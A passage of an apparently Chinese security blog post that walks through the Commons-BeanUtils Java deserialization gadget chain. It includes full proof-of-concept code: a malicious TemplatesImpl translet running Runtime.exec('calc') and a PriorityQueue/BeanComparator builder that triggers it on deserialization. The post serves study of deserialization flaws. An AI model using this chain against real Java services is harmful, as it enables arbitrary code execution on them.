+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.property == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.comparator.compare(o1, o2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty(o2, <span class="built_in">this</span>.property);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.comparator.compare(value1, value2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException iae) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ite) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException nsme) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个方法中有<code>Object value1 = PropertyUtils.getProperty(o1, this.property);</code>中的<code>PropertyUtils.getProperty</code>方法</p>
+<p>到这一步就可以根据上面代码演示中的,如果我们控制传入的参数,达到上面代码演示中的效果.</p>
+<p>就会执行<code>TemplatesImpl.getOutputProperties()</code>方法</p>
+<p><img src="/images/image-20250929164033907.png" alt="image-20250929164033907"></p>
+<p>图片中这三步就是调用TemplatesImpl类中getOutputProperties方法的原理</p>
+<h3 id="3-TemplatesImpl类">3. TemplatesImpl类</h3>
+<p>查看<code>TemplatesImpl</code>的<code>getOutputProperties()</code>方法</p>
+<p><img src="/images/image-20250929160041377.png" alt="image-20250929160041377">\</p>
+<p>执行了<code>newTransformer</code>方法</p>
+<p><img src="/images/image-20250929160157716.png" alt="image-20250929160157716"></p>
+<p>这个方法中有<code>getTransletInstance</code>方法的执行,跟进去</p>
+<p><img src="/images/image-20250929160301393.png" alt="image-20250929160301393"></p>
+<p>_name设置为null,防止直接return</p>
+<p>然后执行<code>this.defineTransletClasses();</code>,跟进去,</p>
+<p><img src="/images/image-20250929162847375.png" alt="image-20250929162847375"></p>
+<p>控制满足条件后执行,执行<code>this._class[i] = loader.defineClass(this._bytecodes[i]);</code>.</p>
+<p>这里最终实现<br>
+动态类加载：使用 ClassLoader.defineClass 方法将字节码数组动态加载为Java类<br>
+恶意代码执行：将预先构造的恶意字节码转换为可执行的类实例.</p>
+<p>由此触发漏洞</p>
+<h3 id="弹出计算器">弹出计算器</h3>
+<p>写一个恶意程序,通过<code>javac</code>编译成<code>class</code>文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> calc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilT</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilT</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后构造CB链实现弹出计算器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> calc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CBChainCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 读取恶意类字节码（核心：准备触发代码执行的&quot;弹药&quot;）</span></span><br><span class="line">        <span class="comment">// EvilT.class是预编译的恶意类，继承自AbstractTranslet，构造函数中包含Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span></span><br><span class="line">        <span class="type">byte</span>[] maliciousBytecode = readClassFile(<span class="string">&quot;EvilT.class的绝对路径&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 初始化TemplatesImpl并注入恶意字节码（关键：构建漏洞触发的&quot;载体&quot;）</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// 设置_bytecodes字段：存储恶意类字节码，后续会被defineTransletClasses()加载</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;maliciousBytecode&#125;);</span><br><span class="line">        <span class="comment">// 设置_name字段：必须非null，否则getTransletInstance()会直接return null，中断调用链</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;CalcTemplate&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置_tfactory字段：提供TransformerFactory实例，避免getOutputProperties()中出现空指针</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 创建BeanComparator（核心：构建属性访问的&quot;触发器&quot;）</span></span><br><span class="line">        <span class="comment">// BeanComparator实现了Comparator接口，其compare()方法会调用PropertyUtils.getProperty()</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 初始化PriorityQueue（关键：构建触发排序的&quot;容器&quot;）</span></span><br><span class="line">        <span class="comment">// 初始化容量为2的优先队列，传入comparator作为排序器</span></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// 添加两个占位元素：目的是让队列size&gt;=2，满足后续heapify()方法的执行条件（size &gt;&gt;&gt; 1 &gt;=1）</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 替换队列元素为templates（关键：将&quot;载体&quot;注入排序流程）</span></span><br><span class="line">        <span class="comment">// 通过反射获取PriorityQueue的底层数组（queue字段）</span></span><br><span class="line">        Object[] queueArray = (Object[]) getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        <span class="comment">// 将数组中的元素替换为TemplatesImpl实例，后续排序时会对这些实例进行比较</span></span><br><span class="line">        queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">        queueArray[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 设置BeanComparator的比较属性（核心：指定触发的方法路径）</span></span><br><span class="line">        <span class="comment">// 设置property为&quot;outputProperties&quot;，使得PropertyUtils.getProperty()会调用templates.getOutputProperties()</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. 序列化+反序列化触发漏洞（关键：利用反序列化执行排序逻辑）</span></span><br><span class="line">        <span class="comment">// PriorityQueue的readObject()方法会在反序列化时调用heapify()，启动整个调用链</span></span><br><span class="line">        serializeAndDeserialize(queue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取.class文件的字节码</span></span><br><span class="line"><span class="comment">     * 作用：将预编译的恶意类（EvilT.class）转换为字节数组，供TemplatesImpl加载</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] readClassFile(String filePath) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">             <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 反射设置私有字段值</span></span><br><span class="line"><span class="comment">     * 作用：突破访问权限，修改关键类的私有字段（如TemplatesImpl的_bytecodes、PriorityQueue的queue等）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>); <span class="comment">// 暴力反射：允许修改私有字段</span></span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 反射获取私有字段值</span></span><br><span class="line"><span class="comment">     * 作用：获取无法直接访问的私有字段（如PriorityQueue的底层数组queue）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 序列化和反序列化对象</span></span><br><span class="line"><span class="comment">     * 核心作用：触发PriorityQueue的readObject()方法，该方法会调用heapify()启动排序流程</span></span><br><span class="line"><span class="comment">     * 为什么需要序列化？因为CB链是典型的反序列化漏洞利用链，漏洞点通常在反序列化阶段的对象恢复逻辑中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeAndDeserialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 序列化：将对象转换为字节流</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj); <span class="comment">// 触发对象的序列化逻辑</span></span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Serialized!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化：将字节流恢复为对象，此时会执行readObject()方法</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject(); <span class="comment">// 触发PriorityQueue的readObject()，启动调用链</span></span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Deserialized!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<p>运行就可以弹出计算器</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/28/Java%E6%94%BB%E9%98%B2/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E1/" rel="prev" title="Shiro反序列化漏洞1">
+                  <i class="fa fa-angle-left"></i> Shiro反序列化漏洞1
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
